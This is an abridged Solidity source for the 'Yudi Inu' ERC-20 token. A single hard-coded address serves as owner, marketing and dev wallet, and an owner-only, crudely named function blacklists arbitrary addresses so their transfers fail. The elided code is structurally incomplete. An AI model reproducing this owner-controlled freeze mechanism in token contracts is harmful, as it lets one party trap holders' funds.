...
contract TESTYUDI is Context, IERC20 { 
    ...
    mapping (address => bool) public BotDetected;

    address payable public Wallet_Marketing = payable(0x47FA7Cae43aDF3d5aa7cB6c8246F9c337b777F09); 
    address payable public Wallet_Dev = payable(0x47FA7Cae43aDF3d5aa7cB6c8246F9c337b777F09);
    ...
    string private constant _name = "Yudi Inu"; 
    string private constant _symbol = unicode"Yudi"; 
    ...
    modifier lockTheSwap {
        ...
        function BotFucker(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i< addresses.length; ++i) {
        BotDetected[addresses[i]] = true;
      }
    }
    
    constructor () {

        _owner = 0x47FA7Cae43aDF3d5aa7cB6c8246F9c337b777F09;
    ...
    function _transfer(
        ...
        if (to != owner() &&
            ...
            require(!BotDetected[from] && !BotDetected[to], "Disgusting Bot Detected");
